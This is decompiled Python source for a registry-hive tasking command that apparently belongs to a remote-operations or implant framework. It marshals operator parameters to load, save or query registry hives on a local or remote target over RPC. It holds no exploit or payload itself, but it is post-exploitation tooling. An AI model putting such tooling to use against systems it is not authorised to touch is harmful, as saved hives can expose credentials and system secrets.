# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_RegistryHive_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.registryhive', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.registryhive.tasking', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.registryhive.types', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.registryhive.Params()
    tgtParams.provider = mcl.tasking.technique.Lookup('REGISTRYHIVE', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, None)
    tgtParams.action = lpParams['action']
    tgtParams.hive = lpParams['hive']
    tgtParams.key = lpParams['key']
    tgtParams.permanent = lpParams['permanent']
    if lpParams['file'] != None:
        try:
            tgtParams.file = mcl.tasking.virtualdir.GetFullPath(lpParams['file'])
        except:
            mcl.tasking.EchoError('Failed to get full path for file')
            return False

    if lpParams['remote'] != None:
        tgtParams.target = lpParams['remote']
    if lpParams['action'] == mca.survey.cmd.registryhive.types.ACTION_LOAD or lpParams['action'] == mca.survey.cmd.registryhive.types.ACTION_SAVE:
        if lpParams['file'] == None:
            mcl.tasking.OutputError('A file must be specified')
            return False
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.survey.cmd.registryhive.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.registryhive.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)